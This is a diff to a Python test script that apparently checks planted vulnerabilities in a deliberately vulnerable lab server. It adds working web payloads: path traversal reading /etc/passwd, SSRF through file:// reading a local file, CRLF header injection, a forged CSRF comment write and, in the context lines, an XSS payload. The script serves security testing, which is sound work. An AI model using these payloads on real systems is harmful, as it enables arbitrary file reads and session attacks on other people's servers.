@@ -186,6 +186,36 @@ def run(base):
           "server ships an innerHTML sink fed by location.hash "
           "(exploit: /welcome#<img src=x onerror=alert(15)>)")
 
+    # --- red-team findings beyond the primary tags (see RED_TEAM.md) ---
+
+    # VULN-03b LFI via absolute path (os.path.join discards the base dir)
+    _, _, b = _req(base, "/AjaxPage?jspName=/etc/passwd")
+    check("VULN-03b LFI absolute-path read (no ../ needed)", "root:" in b,
+          "jspName=/etc/passwd -> arbitrary file read")
+
+    # VULN-04b SSRF via file:// scheme = a second arbitrary-read primitive
+    _, _, b = _req(base, "/proxy/multivac?url=" +
+                   urllib.parse.quote("file:///etc/hostname"))
+    ok = b.strip() != "" and '"error"' not in b
+    check("VULN-04b SSRF file:// scheme (second read primitive)", ok,
+          "proxy fetched a local file via file://")
+
+    # VULN-16 CRLF / HTTP response-header injection via /go
+    _, hdr, _ = _req(base, "/go?url=" +
+                     urllib.parse.quote("/x\r\nX-Injected: pwned"), follow=False)
+    ok = any(k.lower() == "x-injected" for k in hdr)
+    check("VULN-16 CRLF response-header injection (/go)", ok,
+          "injected X-Injected header via %0d%0a (Set-Cookie -> session fixation)")
+
+    # VULN-17 CSRF: cross-origin state-changing write accepted (no token/Origin)
+    marker = "csrf-check-" + str(os.getpid())
+    st, _, _ = _req(base, "/api/comments", method="POST",
+                    data={"articleId": "1001", "name": "x", "text": marker})
+    _, _, jb = _req(base, "/api/comments?articleId=1001")
+    check("VULN-17 CSRF (state-changing POST, no token/Origin check)",
+          marker in jb and st in (200, 302),
+          "forged comment write landed with no CSRF token")
+
     # RE-1 lobby header-bidding loader deobfuscates coherently
     _, _, js = _req(base, "/static/hb-loader.js")
     try:
